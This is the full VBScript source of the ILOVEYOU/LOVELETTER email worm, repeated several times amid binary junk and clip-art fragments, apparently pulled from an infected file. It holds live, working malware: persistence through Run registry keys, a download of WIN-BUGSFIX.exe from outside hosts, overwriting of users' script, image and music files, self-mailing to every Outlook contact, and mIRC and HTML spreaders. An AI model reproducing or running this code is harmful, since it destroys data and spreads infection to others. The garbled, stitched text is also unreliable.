rem  barok -loveletter(vbe) <i hate go to school>
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\Very Funny.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send $nick "&dirsystem&"\Very Funny.HTM"
scriptini.WriteLine "n3=}"
scriptini.close
eq=folderspec
end if
end if
next  
end sub
sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "fwd: Joke"
male.Body = vbcrlf&""
male.Attachments.Add(dirsystem&"\Very Funny.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
                  nd if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\Very Funny.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\Very Funny.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub                                     kz	��ҷ8P�) ����;���$p��(������J�������Ù��	�H ������K��	q�����������H����ѡ�()���������Ö��� /J�0�$v ���	y`� ��h+ +0 ���tw�>���
!!�@1P���"P��ɊY8p���Z���M��ʚ�"
*@)��)"
�������,:�%2�����U�!�����#5�7��	��
���	
ɞ���
���<����A�
�ۉ�	������+�����/�ȩ� 
 �)�B�+횀�<<����0�WPP�) 2a� 0 �'b2
�"3R7 AA4 8����(!`1�0����*�	��"a#&�������������IH����J�����Ø
�����	*��ϫ����$TB) ���Z�Э�	AA�� ��'��ߜ���0@!!+�����h������������'=8��ة��$)#2��E�q00���!c��[� ���

����)���� �A�����CB��Z�����ÑC32+�H���S�/���U�#	2
ʈ�'2����3������E5!B2�����
��ɹ���r10<����1@		��ɐ I�ٙ��0���˔	/�껻��1�����!1����%%2A  ��
 �!� ���ˉ�w32 ��%#" ������!��ظ�c �
ͬ�65#��ʌɂ� �����3F4!��"� ��ʼ���'"C4�(݀B	�� #3#	�ڼ� b2
����46S(!�5t)������1혩���!����ۑ�B"!��������)����ؙ���ۘ�	���ʉ�������ې�R3 u���bE22� �B�d!
΋�%ST"C��r!3 ��E"2��G#Dc08����#CA��#"�t5d4 ����CC@a�!� �*뻘����WEt@0�	� �01���܄�)�۫�먁	�5(��ɻ�@
�2���̺������ 
�<��������ʈ�BE02�rS�� �1�޽��!
��۔�"B)˼��ʬ��C70R2e��������0�#����������C$2"F 	����ـ����4E3!E0���
��
��eu������	"3��ɩ�qR #

�£����������C3������,M����"1��qs�������"3!
����CR ���?��")(�������� yy������� �����˩�  �'W-L����
(UF������!!0�����6G( :*���sD"
����6%(�����
Q2��������81)0��dU���� *
��������"C@P�	����AArs������E����>+�����	�������!>������%&1!���dW)������" B����99H9�ة�$������8A++���!yj����  �� ���� ���ڻ �Ċ�����0As2C���
$�����( ��@A�� ��!0�}} 0��  XX �����#	��ώ��0 )��C�������A1������2C��	�
���j������%	 �
!r��$������܊���������������W�!B!#���  ���All Categories c:\Program\Vanliga filer\Microsoft Shared\Clipart\cagcat50\PE02484_.wmf  �         -x� � ��2���n ���g���  �            � x     �n č��  �       @�n & x  �            ����� x                ��n        All CategoriesGc:\Program\Vanliga filer\Microsoft Shared\Clipart\cagcat50\PE02484_.wmf                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           ���0��ܬ��!3����ut������ �tBB4P���0	

����	2�2&�Ӛt01���� %pA����Z��	���7aB!5!�( � 0˺�ڸ������ʹ������7 1������3���*���A6vu�����Q 
����vH ��ʀ���%�2D7CU( ��*�ڼ��	������ʠ������ CB�����y3w�� r0��b# p#���������
˔�1��
̨�1�"s$(��1;����	�"�2�
�r�#���7 '������������"���BA�1 ���@�T
���(���u�bE3�2�8@�������ݚ ��̼���"�2��V�������4 ��"�7 t3#���2Ȍ� �	��sU�Ț�������'�@��	�#�ߊ��� �e�(���R�	� ��3�S�8�3sCCU!!	 �,������ H���d�B�c!���ͪ�� � ����
�٠�e� ����� R21a�1C*��������� ���TSB#�S�2 ���� �9�ل����C�G�Cc�"�$2�	ș�D���	��"ə����ꃃ3bB!	0��Q��˜������Dr@(�9;�ڑ�7<!����cxA� ����꾀������R(��5�3�������3#C�*���S�C�3�H�B�R�
ʺ�ȂE3D����X�����1�u3% �68B
�����2)X (*  ������±�<�S�!
����������XA:h������������1�ȘA*�� ���-J
, �S4���� ���!CP+Hڽ���"�
���������p ��&�3����3*0R"��������̻�� �P
��� �������!T!`� ����͛��t! ������������B $0��("����A�a�A!1A�����a	������qs1@� ���
�����ܪ�٨�	���!�r2)Y)�ɠ�������&%qp��0 ����Ƞ��#BB��ʸ�����!��#018�2"$��갑�1"���#�R0
����ȡ0Aڀ��Ѧ���H(
*yp"���,*;�[\Y:� ����
��,L<�� �Ȁ�-��������!  2xr)0:*bR�����99L) 2������
( <�	8���1�����A9H�	������
�����%�����a�Q���×0# �"PI ���)����� �ٿ���૩�-b�ۀ��XE�����!��!�X)#N1�5�A: p"������"� 	(,	�́��
�
s	"B���ې� � ���7!��!8 �X���v&%5! ������ ��%E�H��	����"�ˀ�)��C�����ɿ����1
3� 2!�������C 
H��tF!2�!��	�')Bځ�
�@B��� ������������
�����B�S�1��bR44"��SuR #4�#!"����ݐ���23����������̓��YS""R
2�Ȫ:�������1��R�"p0"�跘E # 22�B���
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\W ��
  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q            ipting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\Very Funny.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send����         ����       )
������������n�G�6�6�4�$������ 
� � 1� C� X� _� [� Sdw'�7�C�O�Y~dqr8w
�
�   �  ��      -    � @   $ ;� F� L� Q� X_g#t $������ �� �� �� �� �� �{ �� �{ |� l� [� I� =� ;� ;�    �  ���      -    � 6   $ �b�y������+�6�8�9�=�I�X�d�v�w�vgq4H+1�?�L�b�b   �  ?��      -    � d   $0 � �~ �t �w �| �r }r qu jk _g Ko <p -| � #� &� (� &� aw��������������2&F2S7a=iDkQi`fsa�b�q���f���w�3�� �� �� �� �   �  �Ÿ      -    � R   $' �������������1�S�^�t��������������������������������z�_�>�!#
 L� P� V� c� f� c� [� P� L� L�    �  �Ÿ      -    �    $ �)�.�/�&������)�)   $ ��� �� �� �� �� � 
� � ��   �  ̌�      -    � ,   $  )6CMTYX Q�F�;�,���	   �  ���      -    �    $ �8�C�F�8���   �           -    �    $ @ h O e ] � _ � W � @ h @ h >   $  �  � ) � 0 � : � @ � E � H � L � T � ] � b � b � ` U P � G � < � 5 � * � $ � * � * � % �  �  �  �  �  �    $	 e 	r 	{ � { $o $g e 	e 	   $ _ � h � m � j � _ � _ � _ �    $
� � � � � 	� � � � $   $ � � (3
?K
"*)22879;7>3B+GN
U�\�e�k�o�r�t�t|tppckTbCX3L B:2� +� $� � � 
�
����������������(   $ i�r���������������������������t�i�i�"   $ 	����#�)�/�/�(����	�	�	�&   $ 9EBMGTN]TeYn^udcval]cVZQSOMGE9E9E(   $ W>^FeMmTt\zck�s�y�n�bxVqPiHcB^<W>W>R   $' ��(�2�<�D�N�X�a�k�w������'�-�1�6�&����� ������t�g�X�L�?�5�,�%����N   $% `,p4?�F�K�O�T�Z�`�d�d�g�k�p�z���������������x�q�m�n�j�f�a�[�U�R�Jn@_6`,`,*   $ SD^LeUl_rhupyw|���z�t~mshia`[WUQJGSDSDR   $' +>(N$[!gsy#~'+~/~3{2�3�6�9�>�B�H�N�R�X�Z�T�L�F�A�B|At?p;l5o/r+q.j1\4P9D+>+>�   $l XPXXVcSlPsL{L�N�R�U�Z�^�c�f�j�k�k�e�Y�P�B�9�)�����������t�g�T�F�;�5�+���� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� ���'�2�>�Q�f�z���������������� �'�6�J�^�r������������������������������z�v�o�j�e�a�_�^�^{aocdeXdP_LXPXP^   $- P�T�X�[�^�c�i�o�t�y�|�����������������������������������������������}�x�q�l�g�d�^�V�R�P�P�2   $ =Z7Y2\-`*e*j.o5s:u@uCpCkDg?c:c9h5k3e6b9_=_=Z=Z   $
6�2�-�'��0�0<   $ ��������������������������������������������������������N   $% �1�#����������������"�3�B�M�W�_�h�c�V�?�*�������������������
�������(�-�1�1�1�3�7�9�:�>�F�Q�Z�b�h�n�g�_�S�F|>u6r2v0}-�+�+�)�'���� y�n�f�^�\�Z�c�c0   $ � ������������
����!�#�#�"� � D   $  q^vb{b^�X�R�N�G�C�6w-n%aXL>0&� "0>JU!i/w>{F{KwRq^q^R   $' �� �� �� �� �� �� �� �� �� �� �� �� �� �����
���� �� �� �� �� �� �� �� �� �� �� 6   $ ��� �� �� �� �� �� �� ��  � � 	� 	� � � � �� �� �� �� �� ���0   $ MSZ+b8gFjSlhm}n�n�i�n�s�t�uxvfvNu@t3_MM.   $ (� 3� ;� C� I� N� P� M� G� =� 5� +� !� � � � &   $ X� [ ^cgjkkfc� b� `� \� U� W� X� X� Z   $+ �� �� �� �� �� �� �� �� �� �� �� �� �� ����~uokm r v��������� �� �� �� �� �� �� �� �� �� �� ��    $ Q� T� W� \� a� c� c� ^� \� U� Q� Q� <   $ �� x� n� c� W� M� G� @� =� C� I� N� R� T� W� X� X� T� P� L� S� ^� k� v� � �� �� ��                        ��� ���%1#5WbA�� ���$(3���	�����܉ޜ���  5127�!��� 	 �"w3	�������F	"�s!"ʈ���������ꨨ��#� � ����������� ˘������S� ي��Q�!�	��Q!3s�B�@����D92� S(�1��(��  2ؚ��U� ��ReC �D�	�R�1�!CB�$&3!"� ��"�7� ��"�
����ݹ� ��� �;��7�!�1�����a�$�!ً �'�H�3�w���2 6�C�B�!�ʙ�ڭ��������%���� �2������#�B ꉛ�ɀ Fb1CC�3�"��8ɻ�V5!!	��r����� ������
,����	�B�(��#�A�4	!	���'B"##"QD	��� ��'�@�'�3A!��̚�ˀ����μ��R�	�#�I����������B��4����3�s����t�S��4�)0�'�1�
Ω�����2��B�(��� ���st2"5���%�BC7�E$A #�"�����R��	��wQ#�!��2������#�C����)��ڼ�"!	��SBS4�)������p+,���;Ȣ
3����%���������	� 0��� � $�������  Ȱ<,���!����8�(!bqbR �!�
��H1� ٙ��������P8��"������2��554���#s0(������
���ئ���ؙ�����������	������2 #7# �p���AR����1Iy+���ȹ�/�)�J����*I(X Ȩ ���"�����R��
yy#!"RA3H� ����3*���h+���*���бH�*0�50# �����#@�����ĘY����sSȈ�٨%� ��0	�(�3�Gr�"��H@Ѫ�ɘ��B����������B����R���,B(q2"XB�A�˯�	������PA��@�����!�������xB� �('�	��
�����@6����2p�����t��D3����	tq������(����͙�����Һ	���"���V:9+�5��� PA �����"c	��#� ����t�	�������	���A�����b�(	�	�$ci2*�����X�&�(����7r�����B�A)4C,��˫��:�� �c3���٭3��� �F 0���U""'���srem  barok -loveletter(vbe) <i hate go to school>
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\W                  t\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\Very Funny.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
